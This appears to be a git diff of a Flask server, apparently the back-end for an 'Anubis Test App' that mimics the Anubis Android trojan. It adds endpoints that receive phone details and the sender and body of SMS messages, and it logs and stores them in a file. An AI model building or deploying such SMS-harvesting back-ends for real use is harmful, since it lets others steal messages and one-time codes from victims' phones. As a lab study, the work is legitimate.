@@ -1,32 +1,36 @@
 from flask import Flask, request, jsonify, render_template
-
+import json
+import os
 app = Flask(__name__)
 
 
 @app.route("/device", methods=["POST"])
 def device():
     device_info = request.get_json()
-    
-
     Manufacturer = device_info['manufacturer']
     Model = device_info['model']
     verison = device_info['androidVersion']
     phoneno = device_info['phoneno']
+    if phoneno ==None:
+     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison)
+    else:
+     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison +  " and phone number is " + phoneno)
    
-   
-    print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison + " and phone number is " + phoneno)
-    result = "Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison + " and phone number is " + phoneno
-
-    return result, 200
+    return "deviceinfo working", 200
     
-    
+@app.route("/sms", methods=["POST"])
+def sms():
+    sms_content = request.get_json()
+    address = sms_content['smsAddress']
+    body = sms_content['smsBody']
 
-    # do something with the device information, for example, store it in a database
+    # append to the existing txt from the Anubis Test App folder according to your own directory
+    # for example
+    with open(os.path.join('C:\\Users\\Jevan\\OneDrive\\Documents\\GitHub\\AnubisTestApp\\', 'smsdata.txt'), 'a') as f:
+        f.write('\n' + body)
 
-
-@app.route("/hello")
-def hello():
-    return "hello"
+    print("SMS Retrieved from Phone Number(" + address + ") : " + body)
+    return "SMS Retrieved from Phone Number(" + address + ") : " + body , 200
 
 if __name__ == "__main__":
     app.run('0.0.0.0', debug=True)
